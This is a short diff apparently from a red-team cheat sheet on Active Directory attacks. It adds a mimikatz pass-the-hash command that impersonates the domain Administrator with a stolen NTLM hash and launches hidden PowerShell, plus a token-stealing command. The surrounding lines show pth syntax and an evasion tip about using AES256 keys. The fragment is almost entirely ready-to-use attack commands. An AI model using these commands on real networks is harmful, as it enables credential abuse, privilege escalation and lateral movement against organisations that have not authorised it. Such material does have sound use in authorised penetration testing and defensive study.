@@ -242,6 +242,11 @@ dcsync
 pth <DOMAIN>\<USER> <NTLM HASH>
 ```
 
+```
+mimikatz sekurlsa::pth /user:Administrator /domain:<DOMAIN> /ntlm:<NTLM> /run:"powershell -w hidden"
+steal_token <PID>
+```
+
 #### Overpass the hash
 - OPSEC: Use AES256 keys
 ```
